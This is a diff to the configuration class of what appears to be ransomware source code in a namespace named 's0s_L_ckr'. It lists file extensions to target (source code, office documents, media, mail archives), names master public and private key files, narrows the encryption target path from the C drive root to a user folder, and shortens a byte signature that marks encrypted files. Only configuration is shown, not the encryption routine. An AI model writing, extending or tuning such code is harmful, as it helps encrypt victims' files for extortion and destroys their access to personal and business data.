@@ -1,5 +1,4 @@
-﻿using System;
-using System.Security.Cryptography;
+﻿using System.Security.Cryptography;
 namespace s0s_L_ckr
 {
     //CONFIGURATION CLASS
@@ -25,21 +24,21 @@ namespace s0s_L_ckr
                 ".CS", ".VB", ".JAVA", ".CLASS", ".JS", ".VBS", ".CSC", ".JSON", ".TXT", ".C", ".CPP", ".H", ".CONFIG", ".PY", ".R", ".XAML", ".JSP", ".PHP",
                 ".DOC", ".DOCX", ".XLS", ".XLSX", ".PPT", ".PPTX",
                 ".MP3", ".MP4", ".AVI", ".MPEG",
-                ".PST", ".MSG", ".EML", ".DBX", ".MBX", ".WAB"
+                ".PST", ".MSG", ".EML", ".DBX", ".MBX",".aapp",".WAB"
             };
         // LOCAL COPY OF MASTER PUBLIC & PRIV KEY (MUTTABLE)
         public const string LOCL_PUB_KEY_NAM = "master_public_key.info";
         public const string LOCL_PRI_KEY_NAM = "master_private_key.info";
-        //PATH for encryption
-        public static readonly string[] TRGT_PTH_FLR = new string[] { "C:\\" };
+        private const string V = @"C:\USER";
 
-        public static readonly byte[] FILE_SIGN = new byte[] {
-            55,55,
-            69,24,
-            69,24,
-            69,24,
-            69,24
+        //PATH for encryption
+        public static readonly string[] TRGT_PTH_FLR = new string[]
+        {
+        V
         };
+
+        public static readonly byte[] FILE_SIGN = new byte[] {55, 55, 69, 24, 69, 24, 69, 24};
         public static readonly int FILE_SIGN_SIZE = FILE_SIGN.Length;
+
     }
 }
